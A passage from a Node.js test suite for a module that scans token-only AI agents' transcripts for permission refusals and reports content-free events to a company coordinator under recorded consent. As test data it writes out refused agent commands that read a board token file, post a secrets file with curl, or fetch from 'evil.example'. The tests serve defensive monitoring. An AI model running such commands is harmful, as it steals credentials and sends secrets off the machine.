'use strict';
/* kosmos#5683 slice 1, board half (part 1a): refusals by the company's own rules, read from token-only agents'
   transcripts and sent to the coordinator. */
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const FLEET_SANDBOX = fs.mkdtempSync(path.join(os.tmpdir(), 'agentevents-5683-'));
process.env.AGENT_WORKFORCE_DATA = path.join(FLEET_SANDBOX, 'data');
process.env.AGENT_WORKFORCE_HOME = path.join(FLEET_SANDBOX, 'home');
process.env.AGENT_WORKFORCE_WORKERS = path.join(FLEET_SANDBOX, 'workers');
test.after(() => fs.rmSync(FLEET_SANDBOX, { recursive: true, force: true }));
const ae = require('./agentevents');
const oe = require('./orgenroll');

/* The real clock: enroll stamps enrolledAt with it, and only refusals after that are sent. */
const NOW = Date.now();
const SECRET = 'cat /Users/ann/.kosmos/board.token';
const ts = (ms) => new Date(ms).toISOString();
const use = (id, name, input, at) => JSON.stringify({ type: 'assistant', timestamp: ts(at || Date.now()),
  message: { role: 'assistant', content: [{ type: 'tool_use', id, name, input }] } });
const result = (id, content, isError, at) => JSON.stringify({ type: 'user', timestamp: ts(at || Date.now()),
  message: { role: 'user', content: [{ type: 'tool_result', tool_use_id: id, content, is_error: isError }] } });
const DENIED = (cmd) => 'Permission to use Bash with command ' + cmd + ' has been denied.';

const ctx = (over) => Object.assign({ agent: 'Scout', session: 'sess-1', platform: 'darwin', boardRoot: '/Users/ann/Library/Kosmos',
  agentDir: '/Users/ann/work/workers/scout', otherAgentDirs: ['/Users/ann/work/workers/rex'], home: '/Users/ann', now: NOW }, over);

test('#5683 scan: a deny-rule refusal is the token-only guard, a Bash EPERM is the sandbox, other errors are not reported', () => {
  const lines = [
    use('tu-1', 'Bash', { command: SECRET }), result('tu-1', DENIED(SECRET), true),
    use('tu-2', 'Bash', { command: 'touch /etc/hosts' }), result('tu-2', 'touch: /etc/hosts: Operation not permitted', true),
    use('tu-3', 'Bash', { command: 'ls /nope' }), result('tu-3', 'ls: /nope: No such file or directory', true),
    use('tu-4', 'Write', { file_path: '/Users/ann/work/workers/rex/notes.md' }), result('tu-4', 'Permission to use Write has been denied.', true),
    use('tu-5', 'Bash', { command: 'echo hi' }), result('tu-5', 'Permission to use Bash with command echo hi has been denied.', false),
  ].join('\n');
  const got = ae.scanText(lines, new Map(), ctx());
  assert.deepEqual(got.map((e) => [e.toolUseRef, e.rule, e.action, e.targetClass]), [
    ['tu-1', 'token-only-guard', 'run', 'home'],   // resolvable: classed by the real roots (in this ctx, none covers it)
    ['tu-2', 'sandbox', 'run', 'system'],
    ['tu-4', 'token-only-guard', 'write', 'other-agent'],
  ]);
  assert.equal(got[0].sessionRef, 'sess-1');
  assert.ok(Math.abs(got[0].at - Math.floor(Date.now() / 1000)) <= 5, 'the event time is the refusal row\'s');
  assert.equal(JSON.stringify(got).includes('board.token'), false, 'a command or path reached an event');
});

test('#5683 scan: an EPERM on a tool that is not Bash, and a refusal older than 7 days, are not reported', () => {
  const lines = [
    use('a', 'Read', { file_path: '/etc/x' }), result('a', 'EPERM: Operation not permitted', true),
    use('b', 'Bash', { command: 'x' }, NOW - 8 * 86400e3), result('b', DENIED('x'), true, NOW - 8 * 86400e3),
  ].join('\n');
  assert.deepEqual(ae.scanText(lines, new Map(), ctx()), []);
});

test('#5683 target classes: board files, the agent\'s own settings, network, and never a path', () => {
  const c = ctx();
  assert.equal(ae.targetClass('Read', { file_path: '/Users/ann/Library/Kosmos/tokens.json' }, c), 'board-files');
  assert.equal(ae.targetClass('Edit', { file_path: '/Users/ann/work/workers/scout/.claude/settings.json' }, c), 'agent-config');
  assert.equal(ae.targetClass('WebFetch', { url: 'https://evil.example' }, c), 'network-host');
  assert.equal(ae.targetClass('Bash', { command: 'curl -d @~/secrets x' }, c), 'home');   // review 6: @file names the file
  assert.equal(ae.targetClass('Bash', { command: 'cat "~/notes.txt"' }, c), 'home');
});

test('#5683 labels: a control or bidi character, or an empty one, is not sent', () => {
  assert.equal(ae.ref('toolu_01ABC-x'), 'toolu_01ABC-x');
  assert.equal(ae.ref('has space'), null, 'a reference that is not an id was kept (relay review 7)');
  assert.equal(ae.ref('a.b'), null);
  assert.equal(ae.label('Scout'), 'Scout');
  assert.equal(ae.label('Sco\u202eut'), null);
  assert.equal(ae.label('a\nb'), null);
  assert.equal(ae.label(''), null);
  assert.equal([...ae.label('x'.repeat(300))].length, 128);
});

/* ---- tick: the gate, the reading, and the send ---- */

const HASH = 'ab'.repeat(32);
function accept(root) {
  const f = path.join(root, oe.ENROLLMENT_FILE);
  const rec = JSON.parse(fs.readFileSync(f, 'utf8'));
  rec.consentHash = HASH;
  fs.writeFileSync(f, JSON.stringify(rec));
  fs.writeFileSync(path.join(root, oe.CONSENT_FILE), JSON.stringify({ order: [HASH], byHash: { [HASH]: {
    reports: ['agent names, the AI provider and model each uses, and whether each is working, waiting or stopped'], usageConsented: false } } }));
}
function coordinator(answer) {
  const sent = [];
  let w = null;   // the enrollment's world, as the coordinator remembers it (the rollup tests' coordinator)
  return {
    sent,
    macRequest: async (m, route, body) => {
      sent.push({ route, body });
      if (route === oe.ROUTES.enroll) { w = body.world; return { ok: true, data: { ok: true, org: { id: 'o', name: 'Acme', slug: 'acme' }, role: 'member', enrolled: { computer: 'c', world: w, thisComputer: true } } }; }
      if (route === oe.ROUTES.status) return { ok: true, data: { member: true, org: { id: 'o', name: 'Acme', slug: 'acme' }, role: 'member', enrolled: { computer: 'c', world: w, thisComputer: true } } };
      if (route === ae.ROUTE) return answer ? answer(body) : { ok: true, data: { ok: true, added: body.events.length } };
      return { ok: false, because: 'unexpected ' + route };
    },
  };
}
function setup(t) {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'agentevents-5683-root-'));
  const tdir = fs.mkdtempSync(path.join(os.tmpdir(), 'agentevents-5683-tr-'));
  t.after(() => { fs.rmSync(root, { recursive: true, force: true }); fs.rmSync(tdir, { recursive: true, force: true }); });
  const file = path.join(tdir, 'sess-9.jsonl');
  /* A refusal from before the enrollment (a minute before this test began). */
  fs.writeFileSync(file, use('old', 'Bash', { command: SECRET }, NOW - 60e3) + '\n' + result('old', DENIED(SECRET), true, NOW - 60e3) + '\n');
  const read = [];
  const sources = (agents) => ({
    agents: () => agents || ['Scout'],
    everyAgent: () => agents || ['Scout'],
    guarded: () => true,
    transcriptDirsOf: (d) => ['/p' + d],
    dirOf: (n) => '/Users/ann/work/workers/' + n.toLowerCase(),
    transcripts: async (dir) => { read.push(dir); return dir.endsWith('/scout') ? [file] : []; },
  });
  return { root, file, sources, read };
}
const append = (file, ...lines) => fs.appendFileSync(file, lines.join('\n') + '\n');

test('#5683 tick: a Kosmos that is not the enrolled one opens no transcript and sends nothing', async (t) => {
  const s = setup(t);
  const c = coordinator();
  const r = await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: s.sources(), now: Date.now() });
  assert.equal(r.sent, 0);
  assert.deepEqual(s.read, [], 'a transcript was opened for a company that does not exist');
  assert.deepEqual(c.sent, []);
});

test('#5683 tick: history before the enrollment is never sent; a new refusal is, once, with no content', async (t) => {
  const s = setup(t);
  const c = coordinator();
  await oe.enroll('ACME-JOIN-1234', true, { root: s.root, remote: c });
  accept(s.root);
  let r = await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: s.sources(), now: Date.now() });
  assert.equal(r.sent, 0, 'a refusal from before the enrollment was sent');
  append(s.file, use('new-1', 'Bash', { command: SECRET }), result('new-1', DENIED(SECRET), true));
  r = await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: s.sources(), now: Date.now() });
  assert.equal(r.sent, 1);
  const sends = c.sent.filter((x) => x.route === ae.ROUTE);
  assert.equal(sends.length, 1);
  const e = sends[0].body.events[0];
  assert.deepEqual(Object.keys(e).sort(), ['action', 'agent', 'at', 'rule', 'sessionRef', 'targetClass', 'toolUseRef', 'world']);
  assert.equal(e.world, oe.readEnrollment({ root: s.root }).world);
  assert.equal(e.toolUseRef, 'new-1');
  assert.equal(JSON.stringify(sends[0].body).includes('board.token'), false, 'content reached the company');
  r = await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: s.sources(), now: Date.now() });
  assert.equal(r.sent, 0, 'the same refusal was sent twice');
});

test('#5683 tick: only token-only agents are read; a failed send keeps the events for the next tick', async (t) => {
  const s = setup(t);
  let refuse = true;
  const c = coordinator(() => (refuse ? { ok: false, because: '503' } : { ok: true, data: { ok: true } }));
  await oe.enroll('ACME-JOIN-1234', true, { root: s.root, remote: c });
  accept(s.root);
  await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: s.sources([]), now: Date.now() });
  assert.deepEqual(s.read, [], 'an agent that is not token-only had its transcript read');
  await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: s.sources(), now: Date.now() });
  append(s.file, use('n2', 'Bash', { command: 'x' }), result('n2', DENIED('x'), true));
  let r = await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: s.sources(), now: Date.now() });
  assert.equal(r.sent, 0);
  refuse = false;
  r = await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: s.sources(), now: Date.now() });
  assert.equal(r.sent, 0, 'sent again inside the wait after a failure (review 2)');
  r = await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: s.sources(), now: Date.now() + 31 * 60e3 });
  assert.equal(r.sent, 1, 'the event a failed send left queued was not sent later');
});

test('#5683 tick: at most 50 events go in one send, the rest next tick', async (t) => {
  const s = setup(t);
  const c = coordinator();
  await oe.enroll('ACME-JOIN-1234', true, { root: s.root, remote: c });
  accept(s.root);
  await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: s.sources(), now: Date.now() });
  const lines = [];
  for (let i = 0; i < 60; i++) lines.push(use('m' + i, 'Bash', { command: 'x' }), result('m' + i, DENIED('x'), true));
  append(s.file, ...lines);
  assert.equal((await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: s.sources(), now: Date.now() })).sent, 50);
  assert.equal((await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: s.sources(), now: Date.now() })).sent, 10);
});

test('#5683 tick: enrolled but with no accepted words recorded here opens no transcript and sends nothing', async (t) => {
  const s = setup(t);
  const c = coordinator();
  await oe.enroll('ACME-JOIN-1234', true, { root: s.root, remote: c });   // joined, but accept() never ran
  await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: s.sources(), now: Date.now() });
  assert.deepEqual(s.read, [], 'a transcript was read under an enrollment with no accepted words');
  assert.equal(c.sent.some((x) => x.route === ae.ROUTE), false);
});

test('#5683 tick: a batch the coordinator refuses as unreadable is dropped, so it never holds back later events', async (t) => {
  const s = setup(t);
  let bad = true;
  const c = coordinator(() => (bad ? { ok: false, because: '400 {"code":"org_agent_events_bad"}' } : { ok: true, data: { ok: true } }));
  await oe.enroll('ACME-JOIN-1234', true, { root: s.root, remote: c });
  accept(s.root);
  await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: s.sources(), now: Date.now() });
  append(s.file, use('p1', 'Bash', { command: 'x' }), result('p1', DENIED('x'), true));
  const r = await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: s.sources(), now: Date.now() });
  assert.equal(r.dropped, 1, 'the refused batch was kept to be refused again');
  bad = false;
  append(s.file, use('p2', 'Bash', { command: 'x' }), result('p2', DENIED('x'), true));
  await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: s.sources(), now: Date.now() });
  const ok = c.sent.filter((x) => x.route === ae.ROUTE).pop();
  assert.deepEqual(ok.body.events.map((e) => e.toolUseRef), ['p2'], 'a later event waited behind the refused one');
});

/* ---- review 1 ---- */

test('#5683 r1: a line longer than the read window is skipped, never wedging the file', (t) => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'agentevents-5683-big-'));
  t.after(() => fs.rmSync(dir, { recursive: true, force: true }));
  const f = path.join(dir, 's.jsonl');
  fs.writeFileSync(f, 'x'.repeat(5 * 1024 * 1024) + '\n' + use('after', 'Bash', { command: 'x' }) + '\n');
  let off = 0; let text = '';
  for (let i = 0; i < 4 && !text.includes('"after"'); i++) { const r = ae.readFrom(f, off); text += r.text; off = r.next; }
  assert.ok(text.includes('"after"'), 'the line after a 5 MB line was never read');
});

test('#5683 r1: a call in one read and its result in the next keep the tool (a sandbox refusal stays one)', () => {
  const calls = new Map();
  assert.deepEqual(ae.scanText(use('s1', 'Bash', { command: 'touch /etc/x' }), calls, ctx()), []);
  const got = ae.scanText(result('s1', 'touch: /etc/x: Operation not permitted', true), calls, ctx());
  assert.deepEqual(got.map((e) => [e.rule, e.targetClass]), [['sandbox', 'system']]);
});

test('#5683 r1: target paths are resolved; ~user and a .claude-like folder are not mistaken', () => {
  const c = ctx();
  assert.equal(ae.targetClass('Read', { file_path: '/Users/ann/work/workers/scout/../../../Library/Kosmos/t.json' }, c), 'board-files');
  assert.equal(ae.targetClass('Read', { file_path: '~bob/x' }, c), 'other');
  assert.equal(ae.targetClass('Edit', { file_path: '/Users/ann/work/workers/scout/.claude-old/settings.json' }, c), 'other');
});

test('#5683 r1: a subagent transcript names its parent session', () => {
  assert.equal(ae.sessionOf('/p/proj/sess-7/subagents/agent-1.jsonl'), 'sess-7');
  assert.equal(ae.sessionOf('/p/proj/sess-7.jsonl'), 'sess-7');
});

async function enrolled(t) {
  const s = setup(t);
  const c = coordinator();
  await oe.enroll('ACME-JOIN-1234', true, { root: s.root, remote: c });
  accept(s.root);
  return { s, c };
}

test('#5683 r1: an event from the future is not sent (it would cost its whole batch)', async (t) => {
  const { s, c } = await enrolled(t);
  append(s.file, use('fut', 'Bash', { command: 'x' }, Date.now() + 3600e3), result('fut', DENIED('x'), true, Date.now() + 3600e3));
  await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: s.sources(), now: Date.now() });
  assert.equal(c.sent.some((x) => x.route === ae.ROUTE), false, 'an event an hour ahead was sent');
});

test('#5683 r1: the company changing its words stops the sends; words accepted again send nothing from the gap', async (t) => {
  const s = setup(t);
  let refuse = true;
  const c = coordinator(() => (refuse ? { ok: false, because: '409 {"code":"org_consent_changed"}' } : { ok: true, data: { ok: true } }));
  await oe.enroll('ACME-JOIN-1234', true, { root: s.root, remote: c });
  accept(s.root);
  await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: s.sources(), now: Date.now() });   // Scout is seen listed
  await new Promise((r) => setTimeout(r, 1100));
  append(s.file, use('g1', 'Bash', { command: 'x' }), result('g1', DENIED('x'), true));
  await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: s.sources(), now: Date.now() });
  assert.equal(oe.mayReport({ root: s.root }), false, 'kept reporting on words the company no longer holds');
  append(s.file, use('g2', 'Bash', { command: 'x' }), result('g2', DENIED('x'), true));   // during the gap
  await new Promise((r) => setTimeout(r, 1100));   // the re-acceptance is a later second than the gap's refusal
  /* Accepted again, as new words (a different hash). */
  const f = path.join(s.root, oe.ENROLLMENT_FILE);
  const rec = JSON.parse(fs.readFileSync(f, 'utf8'));
  const H2 = 'cd'.repeat(32);
  rec.consentHash = H2;
  fs.writeFileSync(f, JSON.stringify(rec));
  fs.writeFileSync(path.join(s.root, oe.CONSENT_FILE), JSON.stringify({ order: [H2], byHash: { [H2]: { reports: ['x'], usageConsented: false } } }));
  refuse = false;
  /* The first tick under the new words starts clean (review 2: then a refusal AFTER it must be sent). */
  await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: s.sources(), now: Date.now() });   // a new consent state has no failure wait
  await new Promise((r) => setTimeout(r, 1100));
  append(s.file, use('g3', 'Bash', { command: 'x' }), result('g3', DENIED('x'), true));
  await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: s.sources(), now: Date.now() });
  const ok = c.sent.filter((x) => x.route === ae.ROUTE).slice(1);
  const refs = ok.flatMap((x) => x.body.events.map((e) => e.toolUseRef));
  assert.equal(refs.includes('g2'), false, 'a refusal from while no words were accepted was sent');
  assert.equal(refs.includes('g1'), false, 'the queue from under the old words was sent under the new ones');
  assert.ok(refs.includes('g3'), 'a refusal after the words were accepted again was never sent');
});

test('#5683 r1: an enrollment with no readable start time sends nothing', async (t) => {
  const { s, c } = await enrolled(t);
  const f = path.join(s.root, oe.ENROLLMENT_FILE);
  const rec = JSON.parse(fs.readFileSync(f, 'utf8'));
  delete rec.enrolledAt;
  fs.writeFileSync(f, JSON.stringify(rec));
  append(s.file, use('z', 'Bash', { command: 'x' }), result('z', DENIED('x'), true));
  const r = await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: s.sources(), now: Date.now() });
  assert.equal(r.sent, 0);
  assert.equal(c.sent.some((x) => x.route === ae.ROUTE), false);
});

test('#5683 r1: a call in one tick and its sandbox result in the next is sent as a sandbox refusal', async (t) => {
  const { s, c } = await enrolled(t);
  await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: s.sources(), now: Date.now() });   // Scout is seen listed
  await new Promise((r) => setTimeout(r, 1100));
  append(s.file, use('sp', 'Bash', { command: 'touch /etc/x' }));
  await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: s.sources(), now: Date.now() });
  append(s.file, result('sp', 'touch: /etc/x: Operation not permitted', true));
  await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: s.sources(), now: Date.now() });
  const ev = c.sent.filter((x) => x.route === ae.ROUTE).flatMap((x) => x.body.events);
  assert.deepEqual(ev.map((e) => [e.toolUseRef, e.rule, e.targetClass]), [['sp', 'sandbox', 'system']]);
});

/* ---- review 2 ---- */

test('#5683 r2: an agent made token-only after joining sends nothing from before it was listed', async (t) => {
  const { s, c } = await enrolled(t);
  /* Rex is not token-only yet: a refusal by the person's own rule. */
  const rexFile = path.join(path.dirname(s.file), 'rex-1.jsonl');
  fs.writeFileSync(rexFile, use('own', 'Bash', { command: 'x' }) + '\n' + result('own', DENIED('x'), true) + '\n');
  const src = (agents) => ({ agents: () => agents, everyAgent: () => agents, transcriptDirsOf: (d) => ['/p' + d], guarded: () => true, dirOf: (n) => '/w/' + n, transcripts: async (d) => (d === '/w/Rex' ? [rexFile] : []) });
  await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: src([]), now: Date.now() });
  await new Promise((r) => setTimeout(r, 1100));
  await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: src(['Rex']), now: Date.now() });   // now listed
  assert.equal(c.sent.some((x) => x.route === ae.ROUTE), false, "the person's own rule's refusal was sent as the company's");
});

test('#5683 r2: the call map keeps no input and forgets a call once it is answered', () => {
  const calls = new Map();
  ae.scanText(use('w1', 'Write', { file_path: '/Users/ann/x', content: 'SECRET'.repeat(1000) }), calls, ctx());
  assert.equal(JSON.stringify([...calls.values()]).includes('SECRET'), false, 'a Write content was kept in memory');
  ae.scanText(result('w1', 'ok', false), calls, ctx());
  assert.equal(calls.size, 0, 'a successful result left its call behind');
});

test('#5683 r2: an old session is skipped without being read', async (t) => {
  const { s, c } = await enrolled(t);
  const old = path.join(path.dirname(s.file), 'old.jsonl');
  /* No final newline: a read would stop at the last complete line, so only the skip lands at the very end. */
  fs.writeFileSync(old, use('o1', 'Bash', { command: 'x' }) + '\n' + result('o1', DENIED('x'), true));
  const past = new Date(Date.now() - 3 * 86400e3);
  fs.utimesSync(old, past, past);
  const src = { agents: () => ['Scout'], everyAgent: () => ['Scout'], transcriptDirsOf: (d) => ['/p' + d], guarded: () => true, dirOf: () => '/w/scout', transcripts: async () => [old] };
  await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: src, now: Date.now() });
  const st = JSON.parse(fs.readFileSync(path.join(s.root, 'agent-events.json'), 'utf8'));
  assert.equal(st.offsets[old], fs.statSync(old).size, 'an old session was not skipped to its end');
});

test('#5683 r2: a batch refused as too big is dropped, and not_enrolled asks the company again', async (t) => {
  const s = setup(t);
  let answer = '400 {"code":"org_agent_events_too_big"}';
  const c = coordinator(() => ({ ok: false, because: answer }));
  await oe.enroll('ACME-JOIN-1234', true, { root: s.root, remote: c });
  accept(s.root);
  await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: s.sources(), now: Date.now() });
  append(s.file, use('b1', 'Bash', { command: 'x' }), result('b1', DENIED('x'), true));
  const r = await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: s.sources(), now: Date.now() });
  assert.equal(r.dropped, 1);
  answer = '403 {"code":"org_not_enrolled"}';
  append(s.file, use('b2', 'Bash', { command: 'x' }), result('b2', DENIED('x'), true));
  const before = c.sent.filter((x) => x.route === oe.ROUTES.status).length;
  await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: s.sources(), now: Date.now() });
  assert.ok(c.sent.filter((x) => x.route === oe.ROUTES.status).length > before, 'not_enrolled did not ask the company again');
});

test('#5683 r2: words withdrawn while the transcripts are read stop the send', async (t) => {
  const { s, c } = await enrolled(t);
  await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: s.sources(), now: Date.now() });
  await new Promise((r) => setTimeout(r, 1100));
  append(s.file, use('lv', 'Bash', { command: 'x' }), result('lv', DENIED('x'), true));
  const src = s.sources();
  const during = { agents: src.agents, dirOf: src.dirOf, transcripts: async (d) => {
    await oe.consentWithdrawn({ root: s.root }, oe.readEnrollment({ root: s.root }).consentHash);   // mid-scan
    return src.transcripts(d);
  } };
  await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: during, now: Date.now() });
  assert.equal(c.sent.some((x) => x.route === ae.ROUTE), false, 'sent after the words were withdrawn mid-tick');
});

test('#5683: a long command with no URL is classified quickly (no quadratic backtracking)', () => {
  const t0 = process.hrtime.bigint();
  const c = ae.targetClass('Bash', { command: 'curl '.repeat(20000) }, ctx());
  const ms = Number(process.hrtime.bigint() - t0) / 1e6;
  assert.notEqual(c, 'network-host');
  assert.ok(ms < 2000, 'classifying a 100 KB command took ' + ms.toFixed(0) + ' ms');   // review 25: wide of load noise; the regression measured 3770 ms
  assert.equal(ae.targetClass('Bash', { command: 'curl -s https://evil.example/x' }, ctx()), 'network-host');
});

/* ---- review 3 ---- */

test('#5683 r3: a Bash target is the most telling path in the command, not the first', () => {
  assert.equal(ae.targetClass('Bash', { command: '/bin/cat /Users/ann/Library/Kosmos/board.token' }, ctx()), 'board-files');
  assert.equal(ae.targetClass('Bash', { command: 'cd /tmp && cat ~/Library/Kosmos/x' }, ctx()), 'board-files');
});

test('#5683 r3: a token-only list file that cannot be read changes nothing (first sightings are kept)', async (t) => {
  const { s, c } = await enrolled(t);
  const sendertoken = require('./sendertoken');
  const listFile = sendertoken.tokenOnlyFile();
  fs.mkdirSync(path.dirname(listFile), { recursive: true });
  t.after(() => { try { fs.unlinkSync(listFile); } catch { /* none */ } });
  fs.writeFileSync(listFile, JSON.stringify({ agents: ['Scout'] }));
  await ae.tick({ platform: 'darwin', root: s.root, remote: c, now: Date.now() });   // the board's own sources
  const before = JSON.parse(fs.readFileSync(path.join(s.root, 'agent-events.json'), 'utf8')).listed;
  assert.ok(Number.isFinite(before.Scout), 'Scout was not seen listed');
  fs.writeFileSync(listFile, '{"agents": ["Sco');   // torn mid-write
  await ae.tick({ platform: 'darwin', root: s.root, remote: c, now: Date.now() + 5000 });
  assert.deepEqual(JSON.parse(fs.readFileSync(path.join(s.root, 'agent-events.json'), 'utf8')).listed, before, 'a torn list wiped the first sightings');
});

test('#5683 r3: too big with many events sends half as many next, never dropping them', async (t) => {
  const s = setup(t);
  let big = true;
  const c = coordinator((body) => (big && body.events.length > 1 ? { ok: false, because: '413 {"code":"org_agent_events_too_big"}' } : { ok: true, data: { ok: true } }));
  await oe.enroll('ACME-JOIN-1234', true, { root: s.root, remote: c });
  accept(s.root);
  await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: s.sources(), now: Date.now() });
  await new Promise((r) => setTimeout(r, 1100));
  append(s.file, use('h1', 'Bash', { command: 'x' }), result('h1', DENIED('x'), true), use('h2', 'Bash', { command: 'x' }), result('h2', DENIED('x'), true));
  const r1 = await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: s.sources(), now: Date.now() });
  assert.equal(r1.dropped, undefined, 'a too-big batch of two was dropped');
  const r2 = await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: s.sources(), now: Date.now() });
  assert.equal(r2.sent, 1, 'half as many were not sent next');
});

test('#5683 r3: words withdrawn and accepted again under the SAME hash send nothing from the gap', async (t) => {
  const s = setup(t);
  let refuse = true;
  const c = coordinator(() => (refuse ? { ok: false, because: '409 {"code":"org_consent_changed"}' } : { ok: true, data: { ok: true } }));
  await oe.enroll('ACME-JOIN-1234', true, { root: s.root, remote: c });
  accept(s.root);
  await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: s.sources(), now: Date.now() });
  await new Promise((r) => setTimeout(r, 1100));
  append(s.file, use('q1', 'Bash', { command: 'x' }), result('q1', DENIED('x'), true));
  await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: s.sources(), now: Date.now() });
  append(s.file, use('q2', 'Bash', { command: 'x' }), result('q2', DENIED('x'), true));   // the gap
  await new Promise((r) => setTimeout(r, 1100));
  accept(s.root);   // the same words (the same hash) accepted again
  refuse = false;
  await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: s.sources(), now: Date.now() });
  await new Promise((r) => setTimeout(r, 1100));
  append(s.file, use('q3', 'Bash', { command: 'x' }), result('q3', DENIED('x'), true));   // after the words are back
  await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: s.sources(), now: Date.now() });
  const refs = c.sent.filter((x) => x.route === ae.ROUTE).slice(1).flatMap((x) => x.body.events.map((e) => e.toolUseRef));
  assert.equal(refs.includes('q2'), false, 'a refusal from the gap was sent');
  assert.equal(refs.includes('q1'), false, 'the queue from before the withdrawal was sent');
  assert.ok(refs.includes('q3'), 'nothing was sent after the words were accepted again');
});

test('#5683 r3: a recently written transcript holding old lines sends none of them (the time filter, not the skip)', async (t) => {
  const { s, c } = await enrolled(t);
  const fresh = path.join(path.dirname(s.file), 'recent-old-lines.jsonl');
  const old = Date.now() - 3600e3;
  fs.writeFileSync(fresh, use('ol', 'Bash', { command: 'x' }, old) + '\n' + result('ol', DENIED('x'), true, old) + '\n');   // mtime: now
  const src = { agents: () => ['Scout'], everyAgent: () => ['Scout'], transcriptDirsOf: (d) => ['/p' + d], guarded: () => true, dirOf: () => '/w/scout', transcripts: async () => [fresh] };
  await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: src, now: Date.now() });
  assert.equal(c.sent.some((x) => x.route === ae.ROUTE), false, 'an hour-old refusal in a fresh file was sent');
});

/* ---- review 4 ---- */

test('#5683 r4: a relative traversal in a Bash command is classed by where it lands', () => {
  assert.equal(ae.targetClass('Bash', { command: 'cat ../../../Library/Kosmos/board.token' }, ctx()), 'board-files');
  assert.equal(ae.label('Sc\u2060out'), null, 'a word joiner passed');
  assert.equal(ae.label('Scout\udb40\udc41'), null, 'a tag character passed');
});

test('#5683 r4: a queued event is dropped an hour before the coordinator would skip it', async (t) => {
  const s = setup(t);
  const c = coordinator(() => ({ ok: false, because: '503' }));
  await oe.enroll('ACME-JOIN-1234', true, { root: s.root, remote: c });
  accept(s.root);
  await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: s.sources(), now: Date.now() });
  await new Promise((r) => setTimeout(r, 1100));
  append(s.file, use('ex', 'Bash', { command: 'x' }), result('ex', DENIED('x'), true));
  await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: s.sources(), now: Date.now() });   // queued, the send fails
  const st = () => JSON.parse(fs.readFileSync(path.join(s.root, 'agent-events.json'), 'utf8'));
  assert.equal(st().pending.length, 1);
  await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: s.sources(), now: Date.now() + (7 * 86400 - 1800) * 1000 });
  assert.equal(st().pending.length, 0, 'an event 6 days 23.5 hours old stayed queued');
});

test('#5683 r4: a failed withdrawal keeps its wait (no signed request every tick)', async (t) => {
  const s = setup(t);
  const c = coordinator(() => ({ ok: false, because: '409 {"code":"org_consent_changed"}' }));
  await oe.enroll('ACME-JOIN-1234', true, { root: s.root, remote: c });
  accept(s.root);
  await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: s.sources(), now: Date.now() });
  await new Promise((r) => setTimeout(r, 1100));
  const real = oe.consentWithdrawn;
  oe.consentWithdrawn = async () => false;   // the record could not be changed
  t.after(() => { oe.consentWithdrawn = real; });
  append(s.file, use('w1', 'Bash', { command: 'x' }), result('w1', DENIED('x'), true));
  await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: s.sources(), now: Date.now() });
  const sends = () => c.sent.filter((x) => x.route === ae.ROUTE).length;
  const n = sends();
  append(s.file, use('w2', 'Bash', { command: 'x' }), result('w2', DENIED('x'), true));
  await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: s.sources(), now: Date.now() });
  await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: s.sources(), now: Date.now() });
  assert.equal(sends(), n, 'a failed withdrawal sent again inside its wait');
});

test('#5683 r4: an offset is kept while its file exists, even when a listing comes back empty', async (t) => {
  const { s, c } = await enrolled(t);
  await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: s.sources(), now: Date.now() });
  const empty = Object.assign({}, s.sources(), { transcripts: async () => [] });
  await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: empty, now: Date.now() });
  const st = JSON.parse(fs.readFileSync(path.join(s.root, 'agent-events.json'), 'utf8'));
  assert.ok(Object.prototype.hasOwnProperty.call(st.offsets, s.file), 'a listing that failed for a moment dropped the offset');
});

/* ---- review 5 ---- */

test('#5683 r5: a sandbox refusal whose call was lost (a restart) is still reported, as Bash', () => {
  const got = ae.scanText(result('lost', 'touch: /etc/x: Operation not permitted', true), new Map(), ctx());
